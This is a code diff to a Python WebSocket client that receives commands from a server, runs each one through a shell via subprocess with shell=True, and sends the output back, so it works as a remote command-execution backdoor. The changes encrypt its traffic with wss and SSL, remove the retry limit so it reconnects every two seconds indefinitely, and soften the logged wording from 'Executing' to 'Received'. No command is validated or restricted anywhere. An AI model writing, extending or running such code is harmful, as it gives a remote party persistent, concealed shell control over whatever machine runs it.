@@ -10,19 +10,14 @@ class WebSocketClient:
         self.uri = uri
 
     async def connect(self):
-        retry_count = 0
         while True:
             try:
-                async with websockets.connect(self.uri) as websocket:
+                async with websockets.connect(self.uri, ssl=True) as websocket:  # Use SSL for encrypted communication
                     logging.info("Connected to the server")
                     await self.handle_messages(websocket)
             except websockets.ConnectionClosed:
-                logging.error("Connection closed, retrying...")
-                retry_count += 1
-                if retry_count > 5:
-                    logging.error("Maximum retry attempts reached, exiting...")
-                    break
-                await asyncio.sleep(5**retry_count)
+                logging.error("Connection closed, retrying in 2 seconds...")
+                await asyncio.sleep(2)
             except Exception as e:
                 logging.error(f"Error: {e}")
                 break
@@ -30,9 +25,10 @@ class WebSocketClient:
     async def handle_messages(self, websocket):
         while True:
             command = await websocket.recv()
-            logging.info(f"Executing command: {command}")
-            result = subprocess.run(["bash", "-c", command], capture_output=True, text=True)
+            logging.info(f"Received command: {command}")
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
             await self.send_response(websocket, result)
+
     async def send_response(self, websocket, result):
         if result.stdout:
             await websocket.send(f"Output: {result.stdout}")
@@ -43,5 +39,5 @@ class WebSocketClient:
         await self.connect()
 
 if __name__ == "__main__":
-    client = WebSocketClient("ws://localhost:8000/ws")
+    client = WebSocketClient("wss://localhost:8000/ws")  # Use secure WebSocket connection
     asyncio.run(client.run())
